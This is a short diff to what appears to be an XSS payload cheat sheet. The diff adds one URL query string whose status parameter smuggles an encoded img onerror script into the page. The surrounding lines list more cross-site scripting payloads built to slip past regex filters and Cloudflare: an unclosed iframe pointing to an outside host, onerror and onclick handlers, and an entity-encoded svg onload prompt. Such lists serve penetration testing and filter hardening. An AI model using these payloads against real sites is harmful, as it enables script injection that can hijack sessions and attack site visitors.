@@ -16,6 +16,7 @@ an XSS payload with Alert Obfuscation, for bypass RegEx filters
 What about incomplete tags? <iframe src=//zseano.com/c=
 <video><source onerror="javascript:alert(document.domain)">
 %20onclick=alert(document.domain)%20
+_=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E&text=
 
 cloudflare bypass
 Dec: <svg onload=prompt%26%230000000040document.domain)>
